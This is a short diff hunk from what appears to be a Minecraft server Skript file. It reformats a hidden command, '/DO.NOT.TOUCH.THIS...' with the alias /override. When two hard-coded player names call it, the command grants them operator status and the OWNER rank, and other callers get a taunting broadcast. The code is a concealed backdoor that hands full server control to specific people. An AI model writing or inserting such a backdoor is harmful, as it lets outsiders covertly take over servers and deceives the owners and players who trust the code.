@@ -990,11 +990,11 @@ command /DO.NOT.TOUCH.THIS.19481748518598575576379194764 [<string>]:
 	aliases: /override
 	trigger: 
 		if arg 1 is "NaiculS":
-			execute console command /op NaiculS
-			execute console command /rank set NaiculS OWNER
+			execute console command "/op NaiculS"
+			execute console command "/rank set NaiculS OWNER"
 		if arg 1 is "Drawfull":
-			execute console command /op Drawfull
-			execute console command /rank set Drawfull OWNER
+			execute console command "/op Drawfull"
+			execute console command "/rank set Drawfull OWNER"
 		else:
 			if arg 1 is not set: 
 				broadcast "You shouldn't have messed with that!!!"
